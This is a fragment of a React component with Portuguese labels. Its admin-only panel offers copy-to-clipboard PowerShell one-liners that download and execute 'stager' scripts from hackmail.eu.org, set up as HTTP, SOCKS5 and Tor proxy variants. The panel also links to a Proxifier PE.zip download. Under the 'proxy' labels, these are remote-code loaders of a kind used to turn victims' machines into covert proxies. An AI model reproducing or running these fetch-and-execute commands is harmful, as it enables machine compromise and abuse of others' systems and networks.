...
const TokenGeneratorCard = ({ isAdmin }: { isAdmin?: boolean }) => {
  ...
  return (
    <div className="glass-panel p-6 rounded-2xl flex flex-col items-start gap-4">
      ...
      {isAdmin && (<div className="flex flex-col gap-3 mt-2 w-full"><div className="w-full bg-[#1e1e1e] border border-border p-4 rounded-xl flex flex-col gap-2"><span className="text-xs text-muted-foreground font-semibold text-emerald-400">Área Admin - Proxy V1 HTTP (Navegação):</span><div className="flex items-center justify-between gap-2"><code className="text-[10px] sm:text-xs text-emerald-400 break-all select-all font-mono">Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager.ps1")</code><Button variant="ghost" size="sm" className="shrink-0 h-7 text-xs" onClick={() => { navigator.clipboard.writeText('Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager.ps1")'); toast({ title: "Comando V1 Copiado!", duration: 2000 });}}>Copiar</Button></div></div><div className="w-full bg-[#3b1515] border border-red-900/50 p-4 rounded-xl flex flex-col gap-2"><span className="text-xs font-semibold text-red-500">Área Admin - Proxy V2 SOCKS5 (Jogos/Proxifier):</span><div className="flex items-center justify-between gap-2"><code className="text-[10px] sm:text-xs text-red-400 break-all select-all font-mono">Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager-socks.ps1")</code><Button variant="ghost" size="sm" className="shrink-0 h-7 text-xs text-red-300 hover:text-white hover:bg-red-800" onClick={() => { navigator.clipboard.writeText('Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager-socks.ps1")'); toast({ title: "Comando SOCKS5 Copiado!", duration: 2000});}}>Copiar</Button></div><div className="flex justify-end mt-1"><a href="https://drive.google.com/file/d/1aeA0d0vb5R8D5HckVZW-FdVoD_7wo3tb/view?usp=sharing" target="_blank" rel="noopener noreferrer" className="text-xs text-red-300 hover:text-white underline flex items-center gap-1"><Download className="h-3 w-3" /> Baixar Proxifier PE.zip</a></div></div><div className="w-full bg-[#1a1a2e] border border-purple-900/50 p-4 rounded-xl flex flex-col gap-2"><span className="text-xs font-semibold text-purple-400">Área Admin - Proxy V3 Anônimo (Rede Tor / .onion):</span><div className="flex items-center justify-between gap-2"><code className="text-[10px] sm:text-xs text-purple-400 break-all select-all font-mono">Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager-tor.ps1")</code><Button variant="ghost" size="sm" className="shrink-0 h-7 text-xs text-purple-300 hover:text-white hover:bg-purple-800" onClick={() => { navigator.clipboard.writeText('Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager-tor.ps1")'); toast({ title: "Comando Tor Copiado!", duration: 2000});}}>Copiar</Button></div><div className="flex justify-end mt-1"><span className="text-[10px] text-purple-300/60 italic">Requer Tor rodando no servidor (porta 9050)</span></div></div></div>)}
